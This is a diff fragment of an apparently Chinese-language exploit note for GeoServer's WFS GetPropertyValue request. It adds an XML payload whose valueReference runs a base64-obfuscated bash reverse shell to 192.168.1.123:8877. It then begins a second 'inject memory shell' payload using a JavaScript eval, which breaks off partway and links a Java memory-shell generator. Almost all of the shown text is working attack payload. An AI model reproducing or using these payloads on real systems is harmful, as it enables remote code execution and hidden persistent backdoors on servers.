@@ -8,6 +8,17 @@ https://github.com/pen4uin/java-memshell-generato
  xmlns:topp='http://www.openplans.org/topp'
  xmlns:fes='http://www.opengis.net/fes/2.0'
  xmlns:wfs='http://www.opengis.net/wfs/2.0'>
+  <wfs:Query typeNames='sf:archsites'/>
+  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIzLzg4NzcgMD4mMQ==}|{base64,-d}|{bash,-i}')</wfs:valueReference>
+</wfs:GetPropertyValue>
+```
+
+##　注入内存马
+```xml
+<wfs:GetPropertyValue service='WFS' version='2.0.0'
+ xmlns:topp='http://www.openplans.org/topp'
+ xmlns:fes='http://www.opengis.net/fes/2.0'
+ xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManage
 r.new(),'js'),'
